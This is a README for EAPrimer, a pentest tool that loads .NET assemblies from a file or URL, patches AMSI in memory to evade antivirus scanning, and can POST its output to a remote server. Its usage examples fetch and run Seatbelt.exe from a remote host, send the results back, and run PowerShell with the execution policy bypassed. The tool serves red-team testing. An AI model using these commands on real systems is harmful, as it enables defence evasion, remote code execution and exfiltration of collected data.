# EAPrimer

EAPrimer can be used to load .Net assemblies from a filepath or URL. On startup, it will attempt to perform in-memory patching of AMSI to bypass detection. By default, output is written to the console, however, this can be directed to a file or even sent via HTTP POST request to a remote server.

The latest, compiled version of the code is available <a href="bin/">here</a>.

#### Usage:
Execute remote file with arguments and send output to server:
```text
EAPrimer.exe -path=https://192.168.1.2/Seatbelt.exe -post=https://192.168.1.2 -args="-group=all"
```

Execute local file with arguments and write output to file:
```text
EAPrimer.exe -path=.\Seatbelt.exe -post=results.txt -args="-group=all"
```


## Invoke-EAPrimer.ps1
The main purpose for writing EAPrimer.exe was to act as a support, or "Primer", for executing assemblies. Ultimately allowing for an "execute_assembly" module in pentest frameworks such as <a href="https://github.com/m8sec/ActiveReign">ActiveReign</a> and <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>. The PowerShell script allows for added flexibility to create these modules.

> ⚠️ Alternate methods have since been used to more efficiently load .NET assemblies in memory. However, I have kept this file in the repo as an additional PoC.

#### Usage:
```powershell
powershell -exec bypass
Import-Module .\Invoke-EAPrimer.ps1
Invoke-EAPrimer -Path .\Seatbelt.exe -Args -group=all
```

## Credit
This was one of my first deep dives into C# and much of the heavy lifting was already done by these guys:
* <a href="https://twitter.com/Flangvik">Flangvik</a> - <a href="https://github.com/Flangvik/NetLoader">NetLoader</a>
* <a href="https://twitter.com/_RastaMouse/">_RastaMouse</a> - <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs">AMSI Bypass</a>

## Notes
* Built with .Net 4.0
* Checkout <a href="https://github.com/Flangvik/SharpCollection">SharpCollection</a> for hosted payloads to test it out!
